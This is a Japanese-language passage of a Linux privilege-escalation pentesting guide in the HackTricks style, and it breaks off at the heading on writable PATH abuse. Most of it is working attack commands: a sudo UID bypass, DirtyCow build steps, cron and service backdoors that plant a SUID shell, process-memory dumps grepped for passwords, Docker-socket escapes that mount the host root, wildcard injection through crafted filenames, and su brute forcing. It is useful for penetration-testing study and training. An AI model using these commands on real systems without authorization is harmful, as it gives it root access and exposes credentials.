# Linux特権昇格

{{#include ../../banners/hacktricks-training.md}}

## システム情報

### OS情報

まず、実行中のOSについての知識を得ることから始めましょう。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### パス

もしあなたが`PATH`変数内の任意のフォルダーに**書き込み権限を持っている場合**、いくつかのライブラリやバイナリをハイジャックできるかもしれません：
```bash
echo $PATH
```
### Env info

環境変数に興味深い情報、パスワード、またはAPIキーはありますか？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

カーネルのバージョンを確認し、特権を昇格させるために使用できるエクスプロイトがあるかどうかを調べます。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
良い脆弱なカーネルのリストといくつかの**コンパイル済みのエクスプロイト**はここにあります: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) と [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)。\
他に**コンパイル済みのエクスプロイト**を見つけることができるサイト: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

そのウェブからすべての脆弱なカーネルバージョンを抽出するには、次のようにします:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
カーネルの脆弱性を検索するのに役立つツールは次のとおりです：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) （被害者で実行、カーネル2.xの脆弱性のみをチェック）

常に**Googleでカーネルバージョンを検索**してください。おそらくあなたのカーネルバージョンがいくつかのカーネル脆弱性に記載されており、その場合、この脆弱性が有効であることが確認できます。

### CVE-2016-5195 (DirtyCow)

Linux特権昇格 - Linuxカーネル <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudoのバージョン

脆弱なsudoバージョンに基づいて、次のように表示されます:
```bash
searchsploit sudo
```
このgrepを使用して、sudoのバージョンが脆弱であるかどうかを確認できます。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg署名の検証に失敗しました

**HTBのsmasher2ボックス**をチェックして、この脆弱性がどのように悪用されるかの**例**を確認してください。
```bash
dmesg 2>/dev/null | grep "signature"
```
### さらなるシステム列挙
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 考えられる防御策の列挙

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

もしあなたがdockerコンテナ内にいる場合、そこから脱出しようとすることができます：

{{#ref}}
docker-security/
{{#endref}}

## Drives

**何がマウントされていて、何がアンマウントされているか**、どこで、なぜそれが行われているのかを確認してください。もし何かがアンマウントされている場合、それをマウントしてプライベート情報を確認しようとすることができます。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用なソフトウェア

有用なバイナリを列挙する
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
また、**コンパイラがインストールされているかどうかを確認してください**。これは、カーネルエクスプロイトを使用する必要がある場合に便利です。使用するマシン（または類似のマシン）でコンパイルすることが推奨されます。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 脆弱なソフトウェアのインストール

**インストールされたパッケージとサービスのバージョン**を確認してください。特権昇格に悪用される可能性のある古いNagiosのバージョンがあるかもしれません…\
より疑わしいインストールされたソフトウェアのバージョンを手動で確認することをお勧めします。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
SSHアクセスがある場合、**openVAS**を使用して、マシンにインストールされている古いおよび脆弱なソフトウェアをチェックすることもできます。

> [!NOTE] > _これらのコマンドはほとんど役に立たない多くの情報を表示するため、インストールされているソフトウェアのバージョンが既知の脆弱性に対して脆弱かどうかをチェックするOpenVASや同様のアプリケーションを推奨します_

## プロセス

実行中の**プロセス**を確認し、どのプロセスが**必要以上の特権を持っているか**をチェックしてください（例えば、rootによって実行されているtomcatなど）。
```bash
ps aux
ps -ef
top -n 1
```
常に可能な [**electron/cef/chromiumデバッガー**] が実行されているか確認してください。これを悪用して特権を昇格させることができます。 **Linpeas** はプロセスのコマンドライン内の `--inspect` パラメータをチェックすることでそれらを検出します。\
また、**プロセスのバイナリに対する特権を確認してください**。誰かを上書きできるかもしれません。

### プロセス監視

[**pspy**](https://github.com/DominicBreuker/pspy) のようなツールを使用してプロセスを監視できます。これは、脆弱なプロセスが頻繁に実行されているか、特定の要件が満たされたときに特定するのに非常に役立ちます。

### プロセスメモリ

サーバーの一部のサービスは、**メモリ内にクリアテキストで資格情報を保存します**。\
通常、他のユーザーに属するプロセスのメモリを読むには**root特権**が必要です。したがって、これは通常、すでにrootであり、さらに資格情報を発見したいときにより有用です。\
ただし、**通常のユーザーとしては、自分が所有するプロセスのメモリを読むことができることを忘れないでください**。

> [!WARNING]
> 現在、ほとんどのマシンは**デフォルトでptraceを許可していない**ため、特権のないユーザーに属する他のプロセスをダンプすることはできません。
>
> ファイル _**/proc/sys/kernel/yama/ptrace_scope**_ はptraceのアクセス制御を管理します：
>
> - **kernel.yama.ptrace_scope = 0**: 同じuidを持つ限り、すべてのプロセスをデバッグできます。これがptracingが機能していた古典的な方法です。
> - **kernel.yama.ptrace_scope = 1**: 親プロセスのみがデバッグできます。
> - **kernel.yama.ptrace_scope = 2**: 管理者のみがptraceを使用できます。これはCAP_SYS_PTRACE権限が必要です。
> - **kernel.yama.ptrace_scope = 3**: ptraceでトレースできるプロセスはありません。一度設定されると、ptracingを再度有効にするには再起動が必要です。

#### GDB

FTPサービスのメモリにアクセスできる場合（例えば）、ヒープを取得し、その資格情報の中を検索することができます。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB スクリプト
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

特定のプロセスIDに対して、**mapsはそのプロセスの**仮想アドレス空間内でメモリがどのようにマッピングされているかを示します。また、**各マッピングされた領域の権限**も表示されます。**mem**擬似ファイルは**プロセスのメモリ自体を公開します**。**maps**ファイルから、どの**メモリ領域が読み取り可能であるか**とそのオフセットがわかります。この情報を使用して、**memファイルにシークし、すべての読み取り可能な領域をファイルにダンプします**。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` はシステムの **物理** メモリへのアクセスを提供し、仮想メモリにはアクセスしません。カーネルの仮想アドレス空間は /dev/kmem を使用してアクセスできます。\
通常、`/dev/mem` は **root** と **kmem** グループのみに読み取り可能です。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDumpは、WindowsのSysinternalsツールスイートからのクラシックなProcDumpツールのLinux版です。入手先は[https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)です。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### ツール

プロセスのメモリをダンプするには、次のものを使用できます：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_ルート要件を手動で削除し、あなたが所有するプロセスをダンプできます
- [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) のスクリプト A.5 (root が必要)

### プロセスメモリからの資格情報

#### 手動の例

認証プロセスが実行中であることがわかった場合：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
プロセスをダンプすることができ（プロセスのメモリをダンプするさまざまな方法を見つけるには前のセクションを参照）、メモリ内の資格情報を検索します：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

ツール [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) は **メモリから平文の認証情報を盗む** ことができ、いくつかの **よく知られたファイル** からも情報を取得します。正しく動作するには root 権限が必要です。

| 機能                                             | プロセス名            |
| ------------------------------------------------ | --------------------- |
| GDM パスワード (Kali デスクトップ、Debian デスクトップ) | gdm-password          |
| Gnome キーチェーン (Ubuntu デスクトップ、ArchLinux デスクトップ) | gnome-keyring-daemon  |
| LightDM (Ubuntu デスクトップ)                    | lightdm               |
| VSFTPd (アクティブ FTP 接続)                     | vsftpd                |
| Apache2 (アクティブ HTTP ベーシック認証セッション)  | apache2               |
| OpenSSH (アクティブ SSH セッション - Sudo 使用)   | sshd:                 |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

スケジュールされたジョブが脆弱であるか確認してください。ルートによって実行されるスクリプトを利用できるかもしれません（ワイルドカードの脆弱性？ルートが使用するファイルを変更できますか？シンボリックリンクを使用しますか？ルートが使用するディレクトリに特定のファイルを作成しますか？）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

例えば、_ /etc/crontab _の中にPATHが見つかります: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ユーザー「user」が/home/userに対して書き込み権限を持っていることに注意してください_)

このcrontabの中で、rootユーザーがパスを設定せずにコマンドやスクリプトを実行しようとするとします。例えば: _\* \* \* \* root overwrite.sh_\
その場合、次のようにしてrootシェルを取得できます:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cronを使用したワイルドカードを含むスクリプト（ワイルドカードインジェクション）

もしrootによって実行されるスクリプトがコマンド内に“**\***”を含んでいる場合、これを利用して予期しないこと（例えば、権限昇格）を引き起こすことができます。例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**パスが** _**/some/path/\***_ **のようにワイルドカードの前にある場合、それは脆弱ではありません（** _**./\***_ **もそうです）。**

次のページを読んで、他のワイルドカードの悪用テクニックを学んでください：

{{#ref}}
wildcards-spare-tricks.md
{{#endref}}

### Cronスクリプトの上書きとシンボリックリンク

**rootによって実行されるcronスクリプトを変更できる場合、非常に簡単にシェルを取得できます：**
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
もしrootによって実行されるスクリプトが**あなたが完全にアクセスできるディレクトリ**を使用している場合、そのフォルダを削除し、**あなたが制御するスクリプトを提供する別のフォルダへのシンボリックリンクフォルダを作成する**ことが有用かもしれません。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 定期的なcronジョブ

1分、2分、または5分ごとに実行されているプロセスを検索するためにプロセスを監視できます。これを利用して特権を昇格させることができるかもしれません。

例えば、**1分間0.1秒ごとに監視**し、**実行回数が少ないコマンドでソート**し、最も実行されたコマンドを削除するには、次のようにします:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**あなたはまた** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **を使用できます**（これは開始されるすべてのプロセスを監視してリストします）。

### 見えないcronジョブ

コメントの後に**キャリッジリターンを入れたcronジョブを作成することが可能です**（改行文字なし）、そしてcronジョブは機能します。例（キャリッジリターン文字に注意）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## サービス

### 書き込み可能な _.service_ ファイル

任意の `.service` ファイルに書き込むことができるか確認してください。できる場合は、それを**修正して**、サービスが**開始**、**再起動**、または**停止**されたときに**バックドアを実行**するようにすることができます（マシンが再起動されるまで待つ必要があるかもしれません）。\
例えば、.service ファイル内にバックドアを作成し、**`ExecStart=/tmp/script.sh`** とします。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリに**書き込み権限**がある場合、それらをバックドアに変更することができるため、サービスが再実行されるとバックドアが実行されます。

### systemd PATH - 相対パス

**systemd** によって使用される PATH は次のコマンドで確認できます:
```bash
systemctl show-environment
```
もしパスのフォルダのいずれかに**書き込む**ことができる場合、**特権を昇格**させることができるかもしれません。次のようなサービス設定ファイルで使用されている**相対パス**を探す必要があります:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
次に、書き込み可能なsystemd PATHフォルダー内にある**相対パスバイナリ**と**同じ名前の** **実行可能ファイル**を作成し、サービスが脆弱なアクション（**Start**、**Stop**、**Reload**）を実行するように求められたときに、あなたの**バックドアが実行されます**（特権のないユーザーは通常サービスを開始/停止できませんが、`sudo -l`を使用できるか確認してください）。

**`man systemd.service`でサービスについて詳しく学びましょう。**

## **タイマー**

**タイマー**は、`**.service**`ファイルやイベントを制御する`**.timer**`で終わるsystemdユニットファイルです。**タイマー**は、カレンダー時間イベントと単調時間イベントのサポートが組み込まれているため、cronの代替として使用でき、非同期で実行できます。

すべてのタイマーを列挙するには、次のコマンドを使用します:
```bash
systemctl list-timers --all
```
### Writable timers

タイマーを変更できる場合、systemd.unitのいくつかのインスタンス（`.service`や`.target`など）を実行させることができます。
```bash
Unit=backdoor.service
```
ドキュメントでは、ユニットについて次のように説明されています：

> このタイマーが経過したときにアクティブにするユニット。引数はユニット名で、接尾辞は ".timer" ではありません。指定されていない場合、この値はタイマー ユニットと同じ名前のサービスにデフォルト設定されます（上記参照）。アクティブにされるユニット名とタイマー ユニットのユニット名は、接尾辞を除いて同一の名前にすることが推奨されます。

したがって、この権限を悪用するには、次のことが必要です：

- **書き込み可能なバイナリを実行している** systemd ユニット（例えば `.service`）を見つける
- **相対パスを実行している** systemd ユニットを見つけ、**systemd PATH** に対して **書き込み権限** を持っている（その実行可能ファイルを偽装するため）

**タイマーについて詳しくは `man systemd.timer` を参照してください。**

### **タイマーの有効化**

タイマーを有効にするには、root 権限が必要で、次のコマンドを実行します：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
**タイマー**は、`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`にシンボリックリンクを作成することで**有効化**されます。

## ソケット

Unixドメインソケット（UDS）は、クライアント-サーバーモデル内で同じまたは異なるマシン間の**プロセス通信**を可能にします。これらは、コンピュータ間通信のために標準のUnixディスクリプタファイルを利用し、`.socket`ファイルを通じて設定されます。

ソケットは`.socket`ファイルを使用して構成できます。

**`man systemd.socket`でソケットについてさらに学ぶ。** このファイル内では、いくつかの興味深いパラメータを設定できます：

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: これらのオプションは異なりますが、**ソケットがリッスンする場所を示すために要約が使用されます**（AF_UNIXソケットファイルのパス、リッスンするIPv4/6および/またはポート番号など）。
- `Accept`: ブール引数を取ります。**true**の場合、**各接続ごとにサービスインスタンスが生成され**、接続ソケットのみがそれに渡されます。**false**の場合、すべてのリッスンソケット自体が**開始されたサービスユニットに渡され**、すべての接続に対して1つのサービスユニットのみが生成されます。この値は、単一のサービスユニットが無条件にすべての受信トラフィックを処理するデータグラムソケットおよびFIFOでは無視されます。**デフォルトはfalse**です。パフォーマンスの理由から、`Accept=no`に適した方法でのみ新しいデーモンを書くことが推奨されます。
- `ExecStartPre`, `ExecStartPost`: リッスンする**ソケット**/FIFOが**作成**されてバインドされる前または後に**実行される**1つ以上のコマンドラインを取ります。コマンドラインの最初のトークンは絶対ファイル名でなければならず、その後にプロセスの引数が続きます。
- `ExecStopPre`, `ExecStopPost`: リッスンする**ソケット**/FIFOが**閉じられ**て削除される前または後に**実行される**追加の**コマンド**です。
- `Service`: **受信トラフィック**で**アクティブ化**する**サービス**ユニット名を指定します。この設定は、Accept=noのソケットにのみ許可されます。デフォルトでは、ソケットと同じ名前のサービス（サフィックスが置き換えられたもの）になります。ほとんどの場合、このオプションを使用する必要はありません。

### 書き込み可能な.socketファイル

**書き込み可能な**`.socket`ファイルを見つけた場合、`[Socket]`セクションの最初に次のように追加できます：`ExecStartPre=/home/kali/sys/backdoor`、これによりソケットが作成される前にバックドアが実行されます。したがって、**おそらくマシンが再起動されるまで待つ必要があります。**\
&#xNAN;_&#x4E;ote that the system must be using that socket file configuration or the backdoor won't be executed_

### 書き込み可能なソケット

**書き込み可能なソケット**を**特定した場合**（_ここではUnixソケットについて話しており、構成`.socket`ファイルについてではありません_）、そのソケットと**通信することができ**、おそらく脆弱性を悪用することができます。

### Unixソケットの列挙
```bash
netstat -a -p --unix
```
### 生の接続
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**エクスプロイトの例:**

{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTPソケット

HTTPリクエストをリッスンしている**ソケット**があるかもしれません（_私は.socketファイルではなく、Unixソケットとして機能するファイルについて話しています_）。これを確認するには、次のコマンドを使用できます:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
もしソケットが**HTTP**リクエストで**応答**する場合、あなたはそれと**通信**でき、場合によっては**いくつかの脆弱性を悪用**できるかもしれません。

### 書き込み可能なDockerソケット

Dockerソケットは、通常`/var/run/docker.sock`に見られる重要なファイルであり、保護されるべきです。デフォルトでは、`root`ユーザーと`docker`グループのメンバーが書き込み可能です。このソケットへの書き込みアクセスを持つことは、特権昇格につながる可能性があります。これを行う方法と、Docker CLIが利用できない場合の代替方法を以下に示します。

#### **Docker CLIを使用した特権昇格**

Dockerソケットへの書き込みアクセスがある場合、次のコマンドを使用して特権を昇格させることができます：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
これらのコマンドを使用すると、ホストのファイルシステムに対してルートレベルのアクセスを持つコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIが利用できない場合でも、DockerソケットはDocker APIと`curl`コマンドを使用して操作できます。

1.  **Dockerイメージのリスト:** 利用可能なイメージのリストを取得します。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **コンテナの作成:** ホストシステムのルートディレクトリをマウントするコンテナを作成するリクエストを送信します。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

新しく作成したコンテナを起動します：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **コンテナに接続:** `socat`を使用してコンテナへの接続を確立し、その中でコマンドを実行できるようにします。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat`接続を設定した後、ホストのファイルシステムに対してルートレベルのアクセスを持つコンテナ内で直接コマンドを実行できます。

### その他

**`docker`グループの中にいるために** dockerソケットに対する書き込み権限がある場合、[**特権を昇格させる方法がさらにあります**](interesting-groups-linux-pe/#docker-group)。もし[**docker APIがポートでリスニングしている場合、あなたはそれを妥協することもできるかもしれません**](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**dockerから抜け出す方法やそれを悪用して特権を昇格させる方法**を確認してください：

{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) 特権昇格

**`ctr`**コマンドを使用できる場合は、**特権を昇格させるために悪用できるかもしれないので、以下のページを読んでください**：

{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** 特権昇格

**`runc`**コマンドを使用できる場合は、**特権を昇格させるために悪用できるかもしれないので、以下のページを読んでください**：

{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Busは、アプリケーションが効率的に相互作用し、データを共有できる高度な**プロセス間通信（IPC）システム**です。現代のLinuxシステムを念頭に設計されており、さまざまな形式のアプリケーション通信のための堅牢なフレームワークを提供します。

このシステムは多用途で、プロセス間のデータ交換を強化する基本的なIPCをサポートし、**強化されたUNIXドメインソケット**を思わせます。さらに、イベントや信号をブロードキャストするのを助け、システムコンポーネント間のシームレスな統合を促進します。たとえば、Bluetoothデーモンからの着信コールに関する信号は、音楽プレーヤーをミュートさせ、ユーザーエクスペリエンスを向上させることができます。加えて、D-Busはリモートオブジェクトシステムをサポートし、アプリケーション間のサービスリクエストやメソッド呼び出しを簡素化し、従来は複雑だったプロセスを効率化します。

D-Busは**許可/拒否モデル**で動作し、メッセージの権限（メソッド呼び出し、信号の送信など）を、ポリシールールの一致の累積効果に基づいて管理します。これらのポリシーはバスとの相互作用を指定し、これらの権限の悪用を通じて特権昇格を許可する可能性があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf`にあるそのようなポリシーの例が提供されており、rootユーザーが`fi.w1.wpa_supplicant1`からメッセージを所有、送信、受信するための権限を詳細に説明しています。

指定されたユーザーやグループがないポリシーは普遍的に適用され、"デフォルト"コンテキストポリシーは他の特定のポリシーにカバーされていないすべてに適用されます。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus通信を列挙し、悪用する方法をここで学びましょう：**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙し、マシンの位置を特定することは常に興味深いです。

### 一般的な列挙
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### オープンポート

アクセスする前に、以前に対話できなかったマシン上で実行されているネットワークサービスを常に確認してください：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

トラフィックをスニッフィングできるか確認してください。できる場合、いくつかの認証情報を取得できるかもしれません。
```
timeout 1 tcpdump
```
## ユーザー

### 一般的な列挙

**who**で自分が誰であるか、どの**privileges**を持っているか、システムにどの**users**がいるか、どのユーザーが**login**でき、どのユーザーが**root privileges**を持っているかを確認してください。
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

いくつかのLinuxバージョンは、**UID > INT_MAX**を持つユーザーが特権を昇格させることを可能にするバグの影響を受けました。詳細情報: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) と [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
**これを利用する**: **`systemd-run -t /bin/bash`**

### Groups

あなたがルート特権を付与する可能性のある**グループのメンバー**であるか確認してください:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

クリップボード内に興味深いものがあるか確認してください（可能であれば）。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### パスワードポリシー
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 知られているパスワード

もしあなたが**環境のパスワードを知っている場合**、そのパスワードを使って**各ユーザーとしてログインを試みてください**。

### Su Brute

多くのノイズを出すことを気にしない場合、`su`と`timeout`バイナリがコンピュータに存在するなら、[su-bruteforce](https://github.com/carlospolop/su-bruteforce)を使ってユーザーをブルートフォースすることができます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)の`-a`パラメータもユーザーをブルートフォースしようとします。

## 書き込み可能なPATHの悪用

### $PATH

